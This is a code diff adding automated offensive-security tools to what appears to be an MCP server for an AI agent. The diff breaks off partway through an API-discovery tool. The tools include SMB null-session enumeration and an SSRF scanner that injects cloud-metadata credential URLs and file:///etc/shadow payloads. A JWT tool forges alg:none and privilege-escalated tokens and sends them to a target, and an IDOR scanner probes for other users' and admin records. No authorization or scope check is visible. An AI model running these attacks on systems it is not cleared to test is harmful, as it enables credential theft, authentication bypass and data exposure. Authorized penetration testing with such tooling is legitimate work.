@@ -5714,6 +5714,969 @@ async def target_profiler(
 
 
 
+
+# ============================================================================
+# ENHANCED MODULES — PHASE 2: DEEP TOOL UPGRADES
+# ============================================================================
+
+@mcp.tool()
+@resolve_references
+async def advanced_arp_discovery(
+    network: str = "192.168.1.0/24",
+    mode: str = "auto",
+    timeout: int = 60
+) -> str:
+    """
+    Enhanced network discovery with multiple fallback modes.
+    Mode: auto (try all), arp (requires root), nmap_ping, ip_neighbor, proc_arp
+    Detects: Rogue DHCP, ARP spoofing, undocumented devices, IP conflicts.
+    """
+    target = InputValidator.sanitize_target(network)
+    trace, progress, exec_dir = _init_tool_context("advanced_arp_discovery", target, 6)
+    inputs = {"network": network, "mode": mode}
+    
+    hosts_discovered = []
+    method_used = None
+    
+    # Step 1: Try arp-scan (requires root/CAP_NET_RAW)
+    progress.update("Trying arp-scan")
+    if mode in ["auto", "arp"]:
+        arp_cmd = ["arp-scan", "--localnet", "-q"]
+        if network != "192.168.1.0/24":
+            arp_cmd = ["arp-scan", network, "-q"]
+        result = run_command_advanced(arp_cmd, timeout=30, trace=trace)
+        if result["success"] and result["stdout"].strip():
+            method_used = "arp-scan"
+            for line in result["stdout"].split("\n"):
+                parts = line.split("\t")
+                if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
+                    hosts_discovered.append({
+                        "ip": parts[0], "mac": parts[1], "vendor": parts[2] if len(parts) > 2 else "Unknown"
+                    })
+    
+    # Step 2: Fallback - nmap ping scan
+    if not hosts_discovered and mode in ["auto", "nmap_ping"]:
+        progress.update("Fallback: nmap ping scan")
+        nmap_cmd = ["nmap", "-sn", "-n", network]
+        result = run_command_advanced(nmap_cmd, timeout=45, trace=trace)
+        if result["success"]:
+            method_used = "nmap-ping"
+            ip_pattern = re.compile(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)")
+            mac_pattern = re.compile(r"MAC Address: ([0-9A-F:]+)\s*\((.*)\)", re.IGNORECASE)
+            current_ip = None
+            for line in result["stdout"].split("\n"):
+                ip_match = ip_pattern.search(line)
+                if ip_match:
+                    current_ip = ip_match.group(1)
+                mac_match = mac_pattern.search(line)
+                if mac_match and current_ip:
+                    hosts_discovered.append({
+                        "ip": current_ip, "mac": mac_match.group(1), "vendor": mac_match.group(2)
+                    })
+                    current_ip = None
+                elif current_ip and "Host is up" in line:
+                    hosts_discovered.append({"ip": current_ip, "mac": "N/A", "vendor": "N/A"})
+                    current_ip = None
+    
+    # Step 3: Fallback - ip neighbor
+    if not hosts_discovered and mode in ["auto", "ip_neighbor"]:
+        progress.update("Fallback: ip neighbor")
+        ip_cmd = ["ip", "neighbor", "show"]
+        result = run_command_advanced(ip_cmd, timeout=10, trace=trace)
+        if result["success"]:
+            method_used = "ip-neighbor"
+            for line in result["stdout"].split("\n"):
+                parts = line.split()
+                if len(parts) >= 5 and "lladdr" in parts:
+                    ip = parts[0]
+                    mac_idx = parts.index("lladdr") + 1
+                    mac = parts[mac_idx] if mac_idx < len(parts) else "N/A"
+                    state = parts[-1] if parts else "unknown"
+                    hosts_discovered.append({"ip": ip, "mac": mac, "vendor": "N/A", "state": state})
+    
+    # Step 4: Fallback - /proc/net/arp
+    if not hosts_discovered and mode in ["auto", "proc_arp"]:
+        progress.update("Fallback: /proc/net/arp")
+        result = run_command_advanced(["cat", "/proc/net/arp"], timeout=5, trace=trace)
+        if result["success"]:
+            method_used = "proc-arp"
+            for line in result["stdout"].split("\n")[1:]:  # Skip header
+                parts = line.split()
+                if len(parts) >= 4:
+                    hosts_discovered.append({
+                        "ip": parts[0], "mac": parts[3], "vendor": "N/A",
+                        "flags": parts[2] if len(parts) > 2 else ""
+                    })
+    
+    # Step 5: Security analysis
+    progress.update("Security analysis")
+    security_alerts = []
+    
+    # Check for duplicate IPs (IP conflict)
+    ip_list = [h["ip"] for h in hosts_discovered]
+    for ip in set(ip_list):
+        if ip_list.count(ip) > 1:
+            security_alerts.append({
+                "type": "IP_CONFLICT", "severity": "HIGH",
+                "detail": f"Multiple hosts claim IP {ip} - possible ARP spoofing"
+            })
+    
+    # Check for duplicate MACs (spoofing indicator)
+    mac_list = [h.get("mac", "N/A") for h in hosts_discovered if h.get("mac") != "N/A"]
+    for mac in set(mac_list):
+        if mac_list.count(mac) > 1:
+            ips_with_mac = [h["ip"] for h in hosts_discovered if h.get("mac") == mac]
+            security_alerts.append({
+                "type": "MAC_DUPLICATE", "severity": "CRITICAL",
+                "detail": f"MAC {mac} appears on multiple IPs: {ips_with_mac} - ARP SPOOFING?"
+            })
+    
+    # Check for common gateway IPs
+    gateway_ips = [h for h in hosts_discovered if h["ip"].endswith(".1") or h["ip"].endswith(".254")]
+    if len(gateway_ips) > 2:
+        security_alerts.append({
+            "type": "ROGUE_GATEWAY", "severity": "CRITICAL",
+            "detail": f"Multiple gateway-like IPs detected - possible rogue DHCP/gateway"
+        })
+    
+    output = {
+        "status": "success",
+        "network": network,
+        "method_used": method_used or "none_available",
+        "hosts_found": len(hosts_discovered),
+        "hosts": hosts_discovered,
+        "security_alerts": security_alerts,
+        "fallback_chain": "arp-scan → nmap -sn → ip neighbor → /proc/net/arp",
+    }
+    
+    progress.update("Complete")
+    output = chain_engine.enrich_with_context("advanced_arp_discovery", target, output)
+    log_tool_execution("advanced_arp_discovery", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def advanced_smb_enum(
+    target: str,
+    mode: str = "auto",
+    username: str = "",
+    password: str = "",
+    timeout: int = 120
+) -> str:
+    """
+    Enhanced SMB/Windows enumeration with multiple tool fallbacks.
+    Uses: enum4linux, smbmap, smbclient, crackmapexec, nmap smb scripts.
+    Detects: Null sessions, guest access, weak shares, domain misconfig.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("advanced_smb_enum", target, 7)
+    inputs = {"target": target, "mode": mode}
+    
+    findings = {"shares": [], "users": [], "groups": [], "policies": [], "vulnerabilities": []}
+    method_used = []
+    
+    # Step 1: Check SMB port availability
+    progress.update("Checking SMB port")
+    port_check = run_command_advanced(
+        ["bash", "-c", f"echo | timeout 5 bash -c 'cat < /dev/tcp/{target}/445' 2>/dev/null && echo OPEN || echo CLOSED"],
+        timeout=10, trace=trace
+    )
+    smb_open = "OPEN" in port_check.get("stdout", "")
+    
+    if not smb_open:
+        # Try with nmap
+        nmap_check = run_command_advanced(["nmap", "-p", "445", "-Pn", "--open", target], timeout=15, trace=trace)
+        smb_open = "445/tcp" in nmap_check.get("stdout", "") and "open" in nmap_check.get("stdout", "")
+    
+    if not smb_open:
+        output = {
+            "status": "success", "target": target,
+            "smb_port_open": False,
+            "detail": "Port 445 (SMB) is closed/filtered on target",
+            "recommendation": "SMB enumeration not applicable - try other services"
+        }
+        progress.update("Complete")
+        output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
+        log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
+        return json.dumps(output, indent=2)
+    
+    # Step 2: Try enum4linux
+    progress.update("Trying enum4linux")
+    enum4linux_cmd = ["enum4linux", "-a", target]
+    if username:
+        enum4linux_cmd.extend(["-u", username, "-p", password or ""])
+    result = run_command_advanced(enum4linux_cmd, timeout=60, trace=trace)
+    if result["success"] and len(result["stdout"]) > 100:
+        method_used.append("enum4linux")
+        # Parse shares
+        for line in result["stdout"].split("\n"):
+            if "Mapping:" in line or "disk" in line.lower():
+                findings["shares"].append(line.strip())
+            if "user:" in line.lower():
+                findings["users"].append(line.strip())
+    
+    # Step 3: Try smbmap
+    progress.update("Trying smbmap")
+    smbmap_cmd = ["smbmap", "-H", target]
+    if username:
+        smbmap_cmd.extend(["-u", username, "-p", password or ""])
+    else:
+        smbmap_cmd.extend(["-u", "", "-p", ""])  # Null session
+    result = run_command_advanced(smbmap_cmd, timeout=30, trace=trace)
+    if result["success"]:
+        method_used.append("smbmap")
+        for line in result["stdout"].split("\n"):
+            if "READ" in line or "WRITE" in line or "NO ACCESS" in line:
+                findings["shares"].append(line.strip())
+                if "WRITE" in line:
+                    findings["vulnerabilities"].append({
+                        "type": "WRITABLE_SHARE", "severity": "CRITICAL",
+                        "detail": f"Writable share found: {line.strip()}"
+                    })
+    
+    # Step 4: Try smbclient for null session
+    progress.update("Null session testing")
+    smbclient_cmd = ["smbclient", "-N", "-L", f"//{target}"]
+    result = run_command_advanced(smbclient_cmd, timeout=15, trace=trace)
+    if result["success"] and "Sharename" in result["stdout"]:
+        method_used.append("smbclient-null")
+        findings["vulnerabilities"].append({
+            "type": "NULL_SESSION", "severity": "HIGH",
+            "detail": "Anonymous/null session SMB access possible"
+        })
+    
+    # Step 5: Nmap SMB scripts
+    progress.update("Nmap SMB scripts")
+    nmap_smb_cmd = ["nmap", "-p", "445", "--script", 
+                    "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln-*",
+                    "-Pn", target]
+    result = run_command_advanced(nmap_smb_cmd, timeout=60, trace=trace)
+    if result["success"]:
+        method_used.append("nmap-smb-scripts")
+        stdout = result["stdout"]
+        if "message_signing: disabled" in stdout.lower():
+            findings["vulnerabilities"].append({
+                "type": "SMB_SIGNING_DISABLED", "severity": "HIGH",
+                "detail": "SMB message signing disabled - MITM possible"
+            })
+        if "smb-vuln-ms17-010" in stdout:
+            findings["vulnerabilities"].append({
+                "type": "ETERNALBLUE", "severity": "CRITICAL",
+                "detail": "MS17-010 (EternalBlue) vulnerability detected!"
+            })
+        if "guest" in stdout.lower() and "account" in stdout.lower():
+            findings["vulnerabilities"].append({
+                "type": "GUEST_ACCOUNT", "severity": "HIGH",
+                "detail": "Guest account appears to be enabled"
+            })
+    
+    # Step 6: Security summary
+    progress.update("Security analysis")
+    output = {
+        "status": "success",
+        "target": target,
+        "smb_port_open": True,
+        "methods_used": method_used,
+        "shares": list(set(findings["shares"])),
+        "users": list(set(findings["users"])),
+        "vulnerabilities": findings["vulnerabilities"],
+        "total_vulns": len(findings["vulnerabilities"]),
+        "critical_count": len([v for v in findings["vulnerabilities"] if v.get("severity") == "CRITICAL"]),
+        "fallback_chain": "enum4linux → smbmap → smbclient → nmap smb-scripts",
+    }
+    
+    progress.update("Complete")
+    output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
+    log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def enhanced_ssrf_scanner(
+    target: str,
+    params: str = "url,redirect,uri,path,next,link,proxy,file,document,src,href,dest,target,rurl,return,window,data,reference,site,html,val,validate,domain,callback,feed,host,port,to,out,view,dir,show,navigation,open,img,load,content",
+    include_cloud: bool = True,
+    include_internal: bool = True,
+    timeout: int = 180
+) -> str:
+    """
+    Enhanced SSRF scanner with cloud metadata, internal network, and protocol-specific payloads.
+    Tests: AWS/GCP/Azure metadata, internal services (Redis, MySQL, ES, etc.), file:// and gopher://.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("enhanced_ssrf_scanner", target, 6)
+    inputs = {"target": target, "params": params, "include_cloud": include_cloud}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    param_list = [p.strip() for p in params.split(",")]
+    ssrf_findings = []
+    
+    # Build SSRF payloads
+    progress.update("Building SSRF payloads")
+    payloads = []
+    
+    if include_cloud:
+        # AWS metadata
+        payloads.extend([
+            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
+            ("aws_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+            ("aws_userdata", "http://169.254.169.254/latest/user-data"),
+            ("aws_identity", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
+            ("aws_ecs", "http://169.254.170.2/v2/credentials"),
+            # GCP metadata
+            ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+            ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+            # Azure metadata
+            ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        ])
+    
+    if include_internal:
+        # Internal services
+        payloads.extend([
+            ("localhost", "http://127.0.0.1/"),
+            ("localhost_admin", "http://127.0.0.1/admin"),
+            ("redis", "http://127.0.0.1:6379/"),
+            ("elasticsearch", "http://127.0.0.1:9200/"),
+            ("mysql", "http://127.0.0.1:3306/"),
+            ("postgres", "http://127.0.0.1:5432/"),
+            ("mongodb", "http://127.0.0.1:27017/"),
+            ("memcached", "http://127.0.0.1:11211/"),
+            ("docker_api", "http://127.0.0.1:2375/containers/json"),
+            ("kubernetes_api", "http://127.0.0.1:10250/pods"),
+            ("internal_10", "http://10.0.0.1/"),
+            ("internal_172", "http://172.16.0.1/"),
+            ("internal_192", "http://192.168.1.1/"),
+        ])
+    
+    # Protocol payloads
+    payloads.extend([
+        ("file_passwd", "file:///etc/passwd"),
+        ("file_hosts", "file:///etc/hosts"),
+        ("file_shadow", "file:///etc/shadow"),
+    ])
+    
+    # Step 2: Test each param with each payload
+    progress.update("Testing SSRF payloads", f"{len(param_list)} params x {len(payloads)} payloads")
+    
+    # Get baseline response for comparison
+    baseline_cmd = ["curl", "-sk", "--max-time", "10", url]
+    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
+    baseline_size = len(baseline_result.get("stdout", ""))
+    
+    for param in param_list[:15]:  # Limit params
+        for payload_name, payload_url in payloads[:15]:  # Limit payloads
+            test_url = f"{url}?{param}={payload_url}"
+            test_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}", test_url]
+            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
+            
+            stdout = result.get("stdout", "")
+            # Check for SSRF indicators
+            ssrf_indicators = {
+                "aws_metadata": ["ami-id", "instance-id", "local-ipv4", "security-credentials"],
+                "gcp_metadata": ["computeMetadata", "service-accounts", "access_token"],
+                "azure_metadata": ["subscriptionId", "resourceGroupName"],
+                "redis": ["redis_version", "REDIS"],
+                "elasticsearch": ["cluster_name", "elasticsearch", "tagline"],
+                "file_passwd": ["root:x:0", "/bin/bash", "/bin/sh"],
+                "docker_api": ["Container", "Image", "Created"],
+                "kubernetes_api": ["Pod", "namespace", "container"],
+            }
+            
+            indicators = ssrf_indicators.get(payload_name, [])
+            if any(ind in stdout for ind in indicators):
+                ssrf_findings.append({
+                    "type": "CONFIRMED_SSRF", "severity": "CRITICAL",
+                    "param": param, "payload": payload_url, "payload_name": payload_name,
+                    "evidence": stdout[:200],
+                    "detail": f"SSRF confirmed via param '{param}' to {payload_name}"
+                })
+            elif len(stdout) > baseline_size * 1.5 and len(stdout) > 100:
+                # Significant size difference might indicate SSRF
+                ssrf_findings.append({
+                    "type": "POSSIBLE_SSRF", "severity": "HIGH",
+                    "param": param, "payload": payload_url, "payload_name": payload_name,
+                    "detail": f"Response size anomaly (baseline:{baseline_size}, got:{len(stdout)})"
+                })
+    
+    # Step 3: Time-based SSRF detection
+    progress.update("Time-based SSRF detection")
+    import time
+    for param in param_list[:5]:
+        # Use a non-routable IP to detect blind SSRF via timeout
+        start = time.time()
+        timeout_url = f"{url}?{param}=http://10.255.255.1/"
+        timeout_cmd = ["curl", "-sk", "--max-time", "8", timeout_url]
+        run_command_advanced(timeout_cmd, timeout=12, trace=trace)
+        elapsed = time.time() - start
+        if elapsed > 5:  # If it takes more than 5s, backend might be trying to connect
+            ssrf_findings.append({
+                "type": "BLIND_SSRF_TIMEOUT", "severity": "MEDIUM",
+                "param": param, "elapsed": f"{elapsed:.1f}s",
+                "detail": f"Param '{param}' causes timeout delay ({elapsed:.1f}s) - possible blind SSRF"
+            })
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "params_tested": min(len(param_list), 15),
+        "payloads_tested": min(len(payloads), 15),
+        "total_findings": len(ssrf_findings),
+        "confirmed_ssrf": [f for f in ssrf_findings if f["type"] == "CONFIRMED_SSRF"],
+        "possible_ssrf": [f for f in ssrf_findings if f["type"] == "POSSIBLE_SSRF"],
+        "blind_ssrf": [f for f in ssrf_findings if f["type"] == "BLIND_SSRF_TIMEOUT"],
+        "all_findings": ssrf_findings,
+        "payloads_used": [p[0] for p in payloads[:15]],
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_ssrf_scanner", target, output)
+    log_tool_execution("enhanced_ssrf_scanner", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def enhanced_jwt_analyzer(
+    token: str = "",
+    target: str = "",
+    test_exploits: bool = True,
+    timeout: int = 60
+) -> str:
+    """
+    Enhanced JWT analysis with exploit testing.
+    Tests: alg:none bypass, HS256/RS256 key confusion, expired token reuse,
+    signature stripping, claim manipulation, kid injection.
+    """
+    trace, progress, exec_dir = _init_tool_context("enhanced_jwt_analyzer", target or "jwt_analysis", 6)
+    inputs = {"token": token[:50] + "...", "target": target, "test_exploits": test_exploits}
+    
+    findings = []
+    
+    # Step 1: Decode JWT
+    progress.update("Decoding JWT")
+    parts = token.split(".")
+    if len(parts) != 3:
+        output = {"status": "error", "detail": "Invalid JWT format (expected 3 parts)"}
+        log_tool_execution("enhanced_jwt_analyzer", target or "jwt", inputs, output, trace, progress)
+        return json.dumps(output, indent=2)
+    
+    import base64
+    def decode_jwt_part(part):
+        padding = 4 - len(part) % 4
+        part += "=" * padding
+        try:
+            return json.loads(base64.urlsafe_b64decode(part))
+        except Exception:
+            return {}
+    
+    header = decode_jwt_part(parts[0])
+    payload_data = decode_jwt_part(parts[1])
+    
+    # Step 2: Algorithm analysis
+    progress.update("Algorithm analysis")
+    alg = header.get("alg", "unknown")
+    
+    if alg.lower() == "none" or alg == "":
+        findings.append({
+            "type": "ALG_NONE", "severity": "CRITICAL",
+            "detail": "JWT uses 'none' algorithm - NO SIGNATURE VERIFICATION!"
+        })
+    elif alg in ["HS256", "HS384", "HS512"]:
+        findings.append({
+            "type": "SYMMETRIC_ALG", "severity": "MEDIUM",
+            "detail": f"JWT uses symmetric algorithm ({alg}) - susceptible to key brute-force"
+        })
+    
+    # Check for weak kid parameter
+    kid = header.get("kid", "")
+    if kid:
+        # kid injection possibilities
+        if any(c in kid for c in ["../", "/", "\\", ";", "|"]):
+            findings.append({
+                "type": "KID_INJECTION", "severity": "CRITICAL",
+                "detail": f"Suspicious kid parameter: {kid} - possible path traversal/injection"
+            })
+        findings.append({
+            "type": "KID_PRESENT", "severity": "INFO",
+            "detail": f"kid parameter: {kid} - test with kid manipulation"
+        })
+    
+    # Step 3: Claim analysis
+    progress.update("Claim analysis")
+    
+    # Check expiration
+    exp = payload_data.get("exp")
+    if exp:
+        import time as time_module
+        if exp < time_module.time():
+            findings.append({
+                "type": "EXPIRED_TOKEN", "severity": "HIGH",
+                "detail": f"Token expired at {datetime.datetime.fromtimestamp(exp).isoformat()}"
+            })
+    else:
+        findings.append({
+            "type": "NO_EXPIRATION", "severity": "HIGH",
+            "detail": "Token has no expiration claim - never expires!"
+        })
+    
+    # Check for sensitive claims
+    sensitive_claims = ["role", "admin", "is_admin", "isAdmin", "permissions", "scope", "groups"]
+    found_sensitive = {k: v for k, v in payload_data.items() if k in sensitive_claims}
+    if found_sensitive:
+        findings.append({
+            "type": "SENSITIVE_CLAIMS", "severity": "MEDIUM",
+            "detail": f"Sensitive claims in payload: {found_sensitive}",
+            "exploitable": "Try changing role/admin values in token"
+        })
+    
+    # Step 4: Exploit generation
+    progress.update("Generating exploit tokens")
+    exploits = []
+    
+    if test_exploits:
+        # alg:none attack
+        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
+        none_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
+        exploits.append({
+            "name": "alg_none_bypass",
+            "token": f"{none_header}.{none_payload}.",
+            "description": "Token with alg:none - bypasses signature verification on vulnerable servers"
+        })
+        
+        # Signature stripping
+        exploits.append({
+            "name": "signature_strip",
+            "token": f"{parts[0]}.{parts[1]}.",
+            "description": "Token with empty signature"
+        })
+        
+        # Claim escalation
+        if "role" in payload_data or "admin" in payload_data:
+            escalated = payload_data.copy()
+            escalated["role"] = "admin"
+            escalated["admin"] = True
+            escalated["is_admin"] = True
+            esc_payload = base64.urlsafe_b64encode(json.dumps(escalated).encode()).decode().rstrip("=")
+            exploits.append({
+                "name": "privilege_escalation",
+                "token": f"{parts[0]}.{esc_payload}.{parts[2]}",
+                "description": "Token with escalated privileges (requires re-signing or alg:none)"
+            })
+        
+        # HS256/RS256 confusion
+        if alg.startswith("RS"):
+            findings.append({
+                "type": "KEY_CONFUSION_POSSIBLE", "severity": "HIGH",
+                "detail": f"Algorithm {alg} detected - test HS256/RS256 confusion attack",
+                "exploit": "Sign with HS256 using the public key as HMAC secret"
+            })
+    
+    # Step 5: Test exploits against target if provided
+    if target and test_exploits:
+        progress.update("Testing exploits against target")
+        target_url = target if target.startswith("http") else f"https://{target}"
+        for exploit in exploits[:3]:
+            test_cmd = ["curl", "-sk", "--max-time", "10", "-H", f"Authorization: Bearer {exploit['token']}", target_url]
+            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
+            status_code = ""
+            if result["success"]:
+                # Check if we got a non-401 response
+                body = result["stdout"]
+                if "unauthorized" not in body.lower() and "invalid" not in body.lower():
+                    exploit["result"] = "POSSIBLE_BYPASS"
+                    findings.append({
+                        "type": "JWT_BYPASS_CONFIRMED", "severity": "CRITICAL",
+                        "exploit": exploit["name"],
+                        "detail": f"Server accepted manipulated token ({exploit['name']})"
+                    })
+                else:
+                    exploit["result"] = "rejected"
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "header": header,
+        "payload": payload_data,
+        "algorithm": alg,
+        "total_findings": len(findings),
+        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
+        "findings": findings,
+        "exploit_tokens": exploits,
+        "recommendations": [
+            "Test each exploit token against authenticated endpoints",
+            "Try alg:none bypass on all protected routes",
+            "If RS256, try key confusion attack with public key",
+            "Check if expired tokens are still accepted",
+        ],
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_jwt_analyzer", target or "jwt_analysis", output)
+    log_tool_execution("enhanced_jwt_analyzer", target or "jwt_analysis", inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def enhanced_idor_scanner(
+    target: str,
+    endpoint: str = "",
+    id_param: str = "id",
+    auth_token: str = "",
+    id_type: str = "auto",
+    timeout: int = 120
+) -> str:
+    """
+    Enhanced IDOR scanner with UUID, base64, hash detection and privilege escalation testing.
+    ID types: auto, sequential, uuid, base64, hash
+    Tests: horizontal access (user A -> user B), vertical access (user -> admin).
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("enhanced_idor_scanner", target, 6)
+    inputs = {"target": target, "endpoint": endpoint, "id_param": id_param, "id_type": id_type}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    if endpoint:
+        url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
+    
+    findings = []
+    
+    # Step 1: ID type detection
+    progress.update("Detecting ID pattern")
+    
+    # Generate test IDs based on type
+    test_ids = []
+    if id_type == "auto" or id_type == "sequential":
+        test_ids.extend([("sequential", str(i)) for i in range(1, 21)])
+    if id_type == "auto" or id_type == "uuid":
+        import uuid as uuid_mod
+        test_ids.extend([
+            ("uuid", "00000000-0000-0000-0000-000000000001"),
+            ("uuid", "00000000-0000-0000-0000-000000000002"),
+            ("uuid", str(uuid_mod.uuid4())),
+        ])
+    if id_type == "auto" or id_type == "base64":
+        test_ids.extend([
+            ("base64", base64.b64encode(b"1").decode()),
+            ("base64", base64.b64encode(b"2").decode()),
+            ("base64", base64.b64encode(b"admin").decode()),
+            ("base64", base64.b64encode(b"user").decode()),
+        ])
+    if id_type == "auto" or id_type == "hash":
+        import hashlib
+        test_ids.extend([
+            ("hash_md5", hashlib.md5(b"1").hexdigest()),
+            ("hash_md5", hashlib.md5(b"2").hexdigest()),
+            ("hash_md5", hashlib.md5(b"admin").hexdigest()),
+        ])
+    
+    # Step 2: Baseline request
+    progress.update("Establishing baseline")
+    headers_opt = ["-H", f"Authorization: Bearer {auth_token}"] if auth_token else []
+    
+    baseline_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}"] + headers_opt + [url]
+    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
+    baseline_body = baseline_result.get("stdout", "")
+    baseline_parts = baseline_body.rsplit("\n", 1)
+    baseline_status = baseline_parts[-1] if len(baseline_parts) > 1 else ""
+    baseline_content = baseline_parts[0] if len(baseline_parts) > 1 else baseline_body
+    
+    # Step 3: Test each ID
+    progress.update("Testing IDOR payloads", f"{len(test_ids)} IDs to test")
+    responses = []
+    
+    for id_type_name, test_id in test_ids[:20]:
+        # Try as query param
+        test_url = f"{url}?{id_param}={test_id}"
+        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}"] + headers_opt + [test_url]
+        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
+        
+        stdout = result.get("stdout", "")
+        parts = stdout.rsplit("\n", 1)
+        response_meta = parts[-1] if len(parts) > 1 else ""
+        response_body = parts[0] if len(parts) > 1 else stdout
+        
+        meta_parts = response_meta.split("|")
+        status = meta_parts[0] if meta_parts else ""
+        size = meta_parts[1] if len(meta_parts) > 1 else "0"
+        
+        responses.append({
+            "id_type": id_type_name, "id_value": test_id,
+            "status": status, "size": size,
+            "has_content": len(response_body) > 50
+        })
+        
+        # Check for IDOR indicators
+        if status == "200" and len(response_body) > 50:
+            # Different content for different IDs = possible IDOR
+            if response_body != baseline_content:
+                findings.append({
+                    "type": "POSSIBLE_IDOR", "severity": "HIGH",
+                    "id_type": id_type_name, "id_value": test_id,
+                    "param": id_param, "status_code": status,
+                    "detail": f"Different content returned for {id_param}={test_id}"
+                })
+    
+    # Step 4: Analyze response patterns
+    progress.update("Analyzing response patterns")
+    
+    # Check for consistent 200s with different sizes (strong IDOR indicator)
+    ok_responses = [r for r in responses if r["status"] == "200" and r["has_content"]]
+    sizes = set(r["size"] for r in ok_responses)
+    if len(ok_responses) > 2 and len(sizes) > 1:
+        findings.append({
+            "type": "IDOR_CONFIRMED", "severity": "CRITICAL",
+            "detail": f"Multiple IDs return different content sizes: {sizes}",
+            "param": id_param,
+            "evidence": f"{len(ok_responses)} successful responses with varying sizes"
+        })
+    
+    # Check 401 vs 403 pattern (access control leak)
+    auth_responses = [r for r in responses if r["status"] in ["401", "403"]]
+    if auth_responses:
+        statuses_401 = [r for r in auth_responses if r["status"] == "401"]
+        statuses_403 = [r for r in auth_responses if r["status"] == "403"]
+        if statuses_401 and statuses_403:
+            findings.append({
+                "type": "ACCESS_CONTROL_LEAK", "severity": "MEDIUM",
+                "detail": "Mix of 401/403 responses reveals which resources exist vs don't exist",
+                "ids_401": [r["id_value"] for r in statuses_401[:5]],
+                "ids_403": [r["id_value"] for r in statuses_403[:5]],
+            })
+    
+    # Step 5: Privilege escalation test
+    progress.update("Privilege escalation testing")
+    priv_esc_findings = []
+    admin_indicators = ["admin", "root", "superuser", "0", "1"]
+    for admin_id in admin_indicators:
+        test_url = f"{url}?{id_param}={admin_id}"
+        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}"] + headers_opt + [test_url]
+        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
+        stdout = result.get("stdout", "")
+        parts = stdout.rsplit("\n", 1)
+        status = parts[-1] if len(parts) > 1 else ""
+        if status == "200":
+            priv_esc_findings.append({
+                "type": "VERTICAL_IDOR", "severity": "CRITICAL",
+                "admin_id": admin_id, "detail": f"Admin resource accessible with {id_param}={admin_id}"
+            })
+    
+    findings.extend(priv_esc_findings)
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "endpoint": endpoint,
+        "id_param": id_param,
+        "ids_tested": len(test_ids[:20]),
+        "total_findings": len(findings),
+        "confirmed_idor": [f for f in findings if f["type"] == "IDOR_CONFIRMED"],
+        "possible_idor": [f for f in findings if f["type"] == "POSSIBLE_IDOR"],
+        "privilege_escalation": priv_esc_findings,
+        "response_analysis": {
+            "total_200": len([r for r in responses if r["status"] == "200"]),
+            "total_403": len([r for r in responses if r["status"] == "403"]),
+            "total_404": len([r for r in responses if r["status"] == "404"]),
+            "unique_sizes": len(sizes) if ok_responses else 0,
+        },
+        "all_findings": findings,
+    }
+    
+    output = chain_engine.enrich_with_context("enhanced_idor_scanner", target, output)
+    log_tool_execution("enhanced_idor_scanner", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def enhanced_api_discovery(
+    target: str,
+    mode: str = "smart",
+    include_swagger: bool = True,
+    include_graphql: bool = True,
+    include_method_probing: bool = True,
+    timeout: int = 180
+) -> str:
+    """
+    Enhanced API endpoint discovery with Swagger/OpenAPI detection, GraphQL probing,
+    method enumeration, and intelligent parameter discovery via error analysis.
+    Discovers undocumented/hidden API endpoints using response code analysis.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("enhanced_api_discovery", target, 8)
+    inputs = {"target": target, "mode": mode}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    discovered_endpoints = []
+    api_docs = {}
+    
+    # Step 1: Swagger/OpenAPI detection
+    progress.update("Searching for API documentation")
+    if include_swagger:
+        swagger_paths = [
+            "/swagger.json", "/swagger/v1/swagger.json", "/swagger-ui.html",
+            "/api-docs", "/api-docs.json", "/v2/api-docs", "/v3/api-docs",
+            "/openapi.json", "/openapi.yaml", "/openapi/v3",
